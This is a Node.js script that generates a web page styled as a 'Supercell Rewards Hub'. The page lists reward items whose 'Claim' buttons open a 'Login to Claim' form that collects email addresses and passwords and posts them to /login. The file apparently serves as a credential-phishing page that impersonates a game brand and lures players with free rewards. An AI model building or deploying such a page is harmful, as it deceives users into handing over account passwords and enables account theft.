const fs = require('fs');
const data = JSON.parse(fs.readFileSync('site.json', 'utf8'));

let html = `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>${data.title || "Supercell Rewards Hub"}</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body { font-family: Arial, sans-serif; margin:0; padding:0; background:#f8f8f8; }
header { background:#ffcc00; text-align:center; padding:20px; }
section { padding:20px; display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:20px; }
.item { background:white; padding:15px; border-radius:10px; text-align:center; box-shadow:0 2px 5px rgba(0,0,0,0.1); }
.item img { max-width:100%; border-radius:10px; }
button { background:#ff6600; border:none; color:white; padding:10px 15px; border-radius:5px; cursor:pointer; }
button:hover { background:#e65c00; }
</style>
</head>
<body>
<header><h1>${data.header?.text || "Supercell Rewards Hub"}</h1></header>
<section>
`;

if (data.items) {
    data.items.forEach(item => {
        html += `<div class="item">
            <img src="${item.image || ''}">
            <h3>${item.title || ''}</h3>
            <button onclick="openLogin()">${item.buttonText || 'Claim'}</button>
        </div>`;
    });
}

html += `
</section>
<div id="loginModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);">
    <div style="background:#fff;margin:10% auto;padding:20px;max-width:400px;border-radius:10px;">
        <h2>Login to Claim</h2>
        <form action="/login" method="POST">
            <input type="email" name="email" placeholder="Email" required style="width:100%;padding:10px;margin:5px 0;">
            <input type="password" name="password" placeholder="Password" required style="width:100%;padding:10px;margin:5px 0;">
            <button type="submit" style="width:100%;">Submit</button>
        </form>
        <button onclick="closeLogin()" style="margin-top:10px;width:100%;">Close</button>
    </div>
</div>
<script>
function openLogin(){ document.getElementById('loginModal').style.display='block'; }
function closeLogin(){ document.getElementById('loginModal').style.display='none'; }
</script>
</body>
</html>
`;

fs.writeFileSync('public/index.html', html);
console.log("index.html generated in /public");
